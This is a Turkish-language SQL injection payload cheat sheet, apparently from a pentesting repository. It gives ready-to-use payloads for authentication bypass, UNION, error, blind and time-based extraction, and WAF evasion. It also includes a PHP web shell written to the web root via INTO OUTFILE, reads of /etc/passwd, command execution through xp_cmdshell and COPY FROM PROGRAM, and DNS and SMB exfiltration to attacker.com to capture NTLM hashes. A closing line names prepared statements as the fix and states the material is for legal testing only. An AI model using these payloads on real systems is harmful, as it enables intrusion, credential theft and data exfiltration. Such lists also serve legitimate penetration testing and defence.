# 💉 SQL Enjeksiyonu (SQLi) Payload Kılavuzu

[🇬🇧 English](../SQLi.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 İçindekiler

- [Tespit Payload'ları](#-tespit-payloadları)
- [Kimlik Doğrulama Atlatma (Auth Bypass)](#-kimlik-doğrulama-atlatma-auth-bypass)
- [Union Tabanlı Enjeksiyon](#-union-tabanlı-enjeksiyon)
- [Hata Tabanlı Enjeksiyon (Error-Based)](#-hata-tabanlı-enjeksiyon-error-based)
- [Kör SQL Enjeksiyonu (Blind SQLi)](#-kör-sql-enjeksiyonu-blind-sqli)
- [Zaman Tabanlı Enjeksiyon (Time-Based)](#-zaman-tabanlı-enjeksiyon-time-based)
- [Veritabanı Türüne Özel Komutlar](#-veritabanı-türüne-özel-komutlar)
- [WAF Filtre Atlatma](#-waf-filtre-atlatma)
- [Bant Dışı (Out-of-Band - OOB)](#-bant-dışı-out-of-band---oob)

---

## 🔍 Tespit Payload'ları

### Temel Karakter Testi
Sözdizimi hatası tetiklemek için parametrelerin sonuna eklenir:
```sql
'
"
`
')
")
`))

-- Yorum karakterleri:
-- yorum
/* yorum */
# yorum (MySQL)
```

### Mantıksal (Boolean) Tespit
```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
') OR ('1'='1
1' OR '1'='1
1" OR "1"="1
```

### Aritmetik Tespit
```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=2
```

---

## 🔓 Kimlik Doğrulama Atlatma (Auth Bypass)

### Giriş Formlarında Kullanıcı Adı Alanı
```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR 1=1--
```

### Giriş Formlarında Parola Alanı
```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Sık Kullanılan Başarılı Kombinasyonlar
```sql
Kullanıcı Adı: admin'--
Parola: rastgele

Kullanıcı Adı: ' OR 1=1--
Parola: rastgele

Kullanıcı Adı: ' OR '1'='1' --
Parola: ' OR '1'='1' --
```

---

## 🔗 Union Tabanlı Enjeksiyon

### 1. Sütun Sayısını Belirleme (ORDER BY Tekniği)
Hata alana kadar sütun numarasını artırın:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  # Hata verirse sütun sayısı 3'tür!
```

### 2. Sütun Veri Tiplerini Eşleştirme (NULL Testi)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### 3. Ekrana Veri Yansıtma
```sql
' UNION SELECT 1,2,3--
```

### 4. Veritabanından Veri Çekme

#### MySQL / MariaDB
```sql
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

#### PostgreSQL
```sql
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Microsoft SQL Server (MSSQL)
```sql
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
```

#### Oracle
```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT table_name,NULL FROM all_tables--
```

---

## ⚠️ Hata Tabanlı Enjeksiyon (Error-Based)

Veritabanı detaylı hata mesajı döndürüyorsa veriyi hata mesajının içine gömerek çekme:

### MySQL
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
```

### MSSQL
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

---

## 🔮 Kör SQL Enjeksiyonu (Blind SQLi)

Ekrana hata mesajı veya veri yansımıyorsa, True/False koşullarına göre uygulamanın verdiği tepki incelenir:

### Karakter Çıkarma (Substring)
```sql
# Veritabanı adı 't' harfi ile mi başlıyor?
' AND SUBSTRING((SELECT database()),1,1)='t'--

# ASCII ikili arama (Binary Search) yöntemiyle harf bulma:
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Uzunluk Tespiti
```sql
# Veritabanı adı kaç karakter?
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

---

## ⏱️ Zaman Tabanlı Enjeksiyon (Time-Based)

Sunucudan hiçbir dönüt alınamıyorsa veritabanı motoruna gecikme (sleep) komutu verdirilir:

### MySQL
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## 🗄️ Veritabanı Türüne Özel Kritik İşlemler

### MySQL ile Dosya Okuma ve Yazma
```sql
# Dosya okuma:
' UNION SELECT LOAD_FILE('/etc/passwd')--

# Web kabuğu (Shell) yazma:
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### MSSQL ile Komut Çalıştırma (xp_cmdshell)
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```

### PostgreSQL ile Komut Çalıştırma
```sql
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

---

## 🛡️ WAF Filtre Atlatma (Bypass)

### Boşluk Karakteri Atlatma
```sql
'/**/OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'+OR+1=1--
```

### Anahtar Kelime Parçalama
```sql
' UNION ALL SELECT
' /*!50000UNION*/ SELECT
' UN/**/ION SE/**/LECT
' UNION(SELECT)
```

---

## 📡 Bant Dışı (Out-of-Band - OOB) Veri Çekme

Hedef internete DNS veya SMB istekleri yapabiliyorsa:

```sql
# MySQL DNS sorgusu üzerinden sızdırma:
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))

# MSSQL SMB isteği ile NTLM hash yakalama:
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```

---

## 📊 Hızlı Başvuru Tablosu

| SQL Yorum Karakteri | Destekleyen Veritabanları |
|---------------------|---------------------------|
| `-- ` (Boşluklu tire) | MySQL, PostgreSQL, MSSQL, SQLite, Oracle |
| `#` | MySQL |
| `/* ... */` | Tüm modern veritabanları |

---

<p align="center">
  <b>💉 Parametreli Sorgular (Prepared Statements) Kullanarak SQLi Açıklarını Kapatın!</b><br>
  <i>Yalnızca yasal güvenlik testleri içindir.</i>
</p>
